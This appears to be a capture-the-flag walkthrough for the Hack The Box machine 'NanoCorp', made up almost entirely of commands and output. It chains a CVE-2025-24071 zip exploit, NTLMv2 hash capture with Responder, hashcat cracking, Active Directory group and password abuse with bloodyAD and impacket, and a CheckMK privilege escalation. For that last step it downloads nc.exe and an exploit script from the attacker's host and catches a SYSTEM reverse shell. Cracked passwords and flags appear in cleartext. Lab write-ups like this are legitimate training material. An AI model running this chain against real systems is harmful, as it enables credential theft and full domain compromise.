```bash
nmap -sC -sT -sV --min-rate 10000 -Pn -p- -oN nmap.txt 10.129.243.199 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-18 01:50 +0000
Nmap scan report for 10.129.243.199
Host is up (0.085s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://nanocorp.htb/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-18 08:50:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5986/tcp  open  ssl/wsmans?
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
56058/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
56063/tcp open  msrpc         Microsoft Windows RPC
56082/tcp open  msrpc         Microsoft Windows RPC
56101/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-18T08:51:46
|_  start_date: N/A
|_clock-skew: 6h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.91 seconds
```

```bash
DNS:
10.129.243.199 dc01.nanocorp.htb nanocorp.htb hire.nanocorp.htb
```

![[Pasted image 20260317190536.png]]
found a vulnerability
https://github.com/ThemeHackers/CVE-2025-24071

```python3 
python3 exploit.py -f documents -i 10.10.15.113

Target IP: 10.10.15.113

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
Output file: exploit.zip
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.
```

```bash 
responder -I tun0 -dwv

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.243.199
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:8da2a4ef89157d3e:22CA930DCA4B31D8182B8AB83C6CBAD6:010100000000000000B161378FB6DC01A104448CA42A50CF0000000002000800340036005600340001001E00570049004E002D00510056004A004600340056003900380033003900500004003400570049004E002D00510056004A00460034005600390038003300390050002E0034003600560034002E004C004F00430041004C000300140034003600560034002E004C004F00430041004C000500140034003600560034002E004C004F00430041004C000700080000B161378FB6DC01060004000200000008003000300000000000000000000000002000006E98E35438F4EDDC8954B87210D901E195884EF574291670280056D153F4BC040A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100310033000000000000000000
```

```bash 
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule

WEB_SVC::NANOCORP:81421aee543ae19b:f9406504af650add9063d0bb32790878:010100000000000000b161378fb6dc012c26f0c171c150350000000002000800340036005600340001001e00570049004e002d00510056004a004600340056003900380033003900500004003400570049004e002d00510056004a00460034005600390038003300390050002e0034003600560034002e004c004f00430041004c000300140034003600560034002e004c004f00430041004c000500140034003600560034002e004c004f00430041004c000700080000b161378fb6dc01060004000200000008003000300000000000000000000000002000006e98e35438f4eddc8954b87210d901e195884ef574291670280056d153f4bc040a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003100310033000000000000000000:dksehdgh712!@#
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: WEB_SVC::NANOCORP:81421aee543ae19b:f9406504af650add...000000
Time.Started.....: Wed Mar 18 04:35:23 2026 (37 secs)
Time.Estimated...: Wed Mar 18 04:36:00 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best66.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3304.5 kH/s (7.49ms) @ Accel:125 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 122428000/946729410 (12.93%)
Rejected.........: 0/122428000 (0.00%)
Restore.Point....: 1854000/14344385 (12.92%)
Restore.Sub.#01..: Salt:0 Amplifier:0-64 Iteration:0-64
Candidate.Engine.: Device Generator
Candidates.#01...: dmoney16 -> rafa
Hardware.Mon.#01.: Util: 54%

Started: Wed Mar 18 04:35:22 2026
Stopped: Wed Mar 18 04:36:02 2026
```

UserCreds:

```
web_svc : dksehdgh712!@#
```
ran rusthound-ce and found that web_svc can add itself to IT_SUPPORT:

```
bloodyAD --host 10.129.243.199 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember IT_SUPPORT web_svc
[+] web_svc added to IT_SUPPORT
```
```
impacket-changepasswd nanocorp.htb/monitoring_svc@10.129.243.199 -newpass 'Password123!' -altuser web_svc -altpass 'dksehdgh712!@#' -reset
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Setting the password of nanocorp.htb\monitoring_svc as nanocorp.htb\web_svc
[*] Connecting to DCE/RPC as nanocorp.htb\web_svc
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
```

```
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/NanoCorp]
└─$ faketime "7+ hours" impacket-getTGT -dc-ip 10.129.243.199 'nanocorp.htb/WEB_SVC:dksehdgh712!@#'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in WEB_SVC.ccache

┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/NanoCorp]
└─$ export KRB5CCNAME=WEB_SVC.ccache

┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/NanoCorp]
└─$ klist
Ticket cache: FILE:WEB_SVC.ccache
Default principal: WEB_SVC@NANOCORP.HTB

Valid starting       Expires              Service principal
03/18/2026 12:56:26  03/18/2026 22:56:26  krbtgt/NANOCORP.HTB@NANOCORP.HTB
        renew until 03/19/2026 12:56:28
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/NanoCorp]
└─$ faketime "7+ hours" bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' -k add groupMember it_support web_svc
[+] web_svc added to it_support
   
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/NanoCorp]
└─$ faketime "7+ hours" bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' -k set password monitoring_svc 'P@ssw0rd444!'
[+] Password changed successfully!

┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/NanoCorp]
└─$ faketime "7+ hours" impacket-getTGT nanocorp.htb/'monitoring_svc:P@ssw0rd444!'                                                                     
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in monitoring_svc.ccache
   
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/NanoCorp]
└─$ export KRB5CCNAME=monitoring_svc.ccache

┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/NanoCorp]
└─$ klist                                                                                                                                               
Ticket cache: FILE:monitoring_svc.ccache
Default principal: monitoring_svc@NANOCORP.HTB

Valid starting       Expires              Service principal
03/18/2026 13:00:42  03/18/2026 17:00:42  krbtgt/NANOCORP.HTB@NANOCORP.HTB
        renew until 03/18/2026 17:00:42
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/NanoCorp]
└─$ faketime "7+ hours" python3 winrmexec.py -ssl -port 5986 -k nanocorp.htb/monitoring_svc@dc01.nanocorp.htb -no-pass 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] '-target_ip' not specified, using dc01.nanocorp.htb
[*] '-url' not specified, using https://dc01.nanocorp.htb:5986/wsman
[*] using domain and username from ccache: NANOCORP.HTB\monitoring_svc
[*] '-spn' not specified, using HTTP/dc01.nanocorp.htb@NANOCORP.HTB
[*] '-dc-ip' not specified, using NANOCORP.HTB
[*] requesting TGS for HTTP/dc01.nanocorp.htb@NANOCORP.HTB
PS C:\Users\monitoring_svc\Documents> dir
PS C:\Users\monitoring_svc\Documents> cd ..
PS C:\Users\monitoring_svc> cd desktop
PS C:\Users\monitoring_svc\desktop> type user.txt
71015228e1f1add832ecd0fdb93d3712

```

Now For Priv/Esc:

```shell
  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        80            [::]                                        0               Listening         1720            httpd
  TCP        [::]                                        88            [::]                                        0               Listening         716             lsass
  TCP        [::]                                        135           [::]                                        0               Listening         1020            svchost
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        464           [::]                                        0               Listening         716             lsass
  TCP        [::]                                        593           [::]                                        0               Listening         1020            svchost
  TCP        [::]                                        3389          [::]                                        0               Listening         936             svchost
  TCP        [::]                                        5986          [::]                                        0               Listening         4               System
  TCP        [::]                                        6556          [::]                                        0               Listening         4008            cmk-agent-ctl
  TCP        [::]                                        9389          [::]                                        0               Listening         1504            Microsoft.ActiveDirectory.WebServices
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         716             lsass
  TCP        [::]                                        49665         [::]                                        0               Listening         580             wininit
  TCP        [::]                                        49666         [::]                                        0               Listening         1292            svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         1752            svchost
  TCP        [::]                                        49668         [::]                                        0               Listening         716             lsass
  TCP        [::]                                        49670         [::]                                        0               Listening         2328            svchost
  TCP        [::]                                        56058         [::]                                        0               Listening         716             lsass
  TCP        [::]                                        56063         [::]                                        0               Listening         716             lsass
  TCP        [::]                                        56072         [::]                                        0               Listening         700             services
  TCP        [::]                                        56082         [::]                                        0               Listening         3076            dns
  TCP        [::]                                        56101         [::]                                        0               Listening         744             dfsrs
  TCP        [::1]                                       53            [::]                                        0               Listening         3076            dns
  TCP        [::1]                                       135           [::1]                                       65074           Established       1020            svchost
  TCP        [::1]                                       49668         [::1]                                       56086           Established       716             lsass
  TCP        [::1]                                       49668         [::1]                                       56113           Established       716             lsass
  TCP        [::1]                                       49668         [::1]                                       63722           Established       716             lsass
  TCP        [::1]                                       49668         [::1]                                       65075           Established       716             lsass
  TCP        [::1]                                       56086         [::1]                                       49668           Established       3432            dfssvc
  TCP        [::1]                                       56113         [::1]                                       49668           Established       744             dfsrs
  TCP        [::1]                                       63722         [::1]                                       49668           Established       716             lsass

```
notice `cmk-agent-ctl` running on `6556`  with `Process ID 4008`:
https://github.com/elsevar11/CVE-2024-0670-CheckMK-Agent-Local-Privilege-Escalation-Exploit
![[Pasted image 20260318123653.png]]```
```powershell
PS C:\Windows\Temp> Invoke-WebRequest -Uri http://10.10.15.113/RunasCs.exe -OutFile RunasCs.exe -UseBasicParsing
PS C:\Windows\Temp> Invoke-WebRequest -Uri http://10.10.15.113/nc.exe -OutFile nc.exe -UseBasicParsing
PS C:\Windows\Temp> Invoke-WebRequest -Uri http://10.10.15.113/exploit.ps1 -OutFile exploit.ps1 -UseBasicParsing
PS C:\Windows\Temp> .\RunasCs.exe web_svc “dksehdgh712!@#” “C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1"

[*] Scanning for Check MK-related MSI files (SYSTEM-owned)...
[*] Successfully found Check MK MSI!
[*] Software Name: Check MK Agent 2.1
[*] MSI Path: C:\Windows\Installer\1e6f2.msi
[*] Seeding 1000 to 10000...
[*] Seeding complete.
[*] Triggering MSI repair for Check MK...
[*] Sucessful!
PS C:\Windows\Temp>
```
connect back to us:
```shell
rlwrap nc -lvnp 8844
listening on [any] 8844 ...
connect to [10.10.15.113] from (UNKNOWN) [10.129.243.199] 60720
Microsoft Windows [Version 10.0.20348.3207]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
027058c1cf96351c2ca1e6ac2bf59e94

C:\Windows\system32>
```
